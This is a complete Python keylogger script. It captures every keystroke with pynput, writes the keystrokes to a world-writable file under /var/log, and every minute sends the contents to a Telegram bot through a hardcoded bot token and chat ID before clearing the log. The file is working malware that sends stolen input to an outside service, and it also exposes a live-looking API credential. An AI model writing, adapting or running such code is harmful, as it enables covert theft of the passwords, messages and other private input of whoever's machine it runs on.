import os
import time
import requests
from pynput import keyboard
from threading import Thread

# Ensure correct environment for Xorg
os.environ["DISPLAY"] = ":0"
os.environ["XDG_SESSION_TYPE"] = "x11"

# Log file location (persistent after reboot)
log_file = "/var/log/keylogger/keylog.txt"
send_interval = 60  # Send logs every 60 seconds
telegram_bot_token = "7530344159:AAEFfjrdsH9u62IN5ArJ9bQto_QDpg4IpZc"
telegram_chat_id = "1653899771"

# Ensure log file exists
if not os.path.exists(log_file):
    open(log_file, "w").close()
    os.chmod(log_file, 0o666)  # Ensure write permissions

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(f'[{key.name}]')  # Special keys
    except Exception as e:
        print(f"Error: {e}")

def send_to_telegram():
    while True:
        if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
            try:
                with open(log_file, "r") as f:
                    content = f.read()

                url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
                payload = {"chat_id": telegram_chat_id, "text": content}
                
                response = requests.post(url, data=payload, timeout=10)  # Added timeout
                
                if response.status_code == 200:
                    open(log_file, "w").close()  # Clear log after sending
                else:
                    print(f"Failed to send message: {response.text}")
            
            except requests.exceptions.RequestException as e:
                print(f"Telegram error (network issue): {e}")
            
            except Exception as e:
                print(f"Unexpected error: {e}")

        time.sleep(send_interval)

telegram_thread = Thread(target=send_to_telegram, daemon=True)
telegram_thread.start()

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
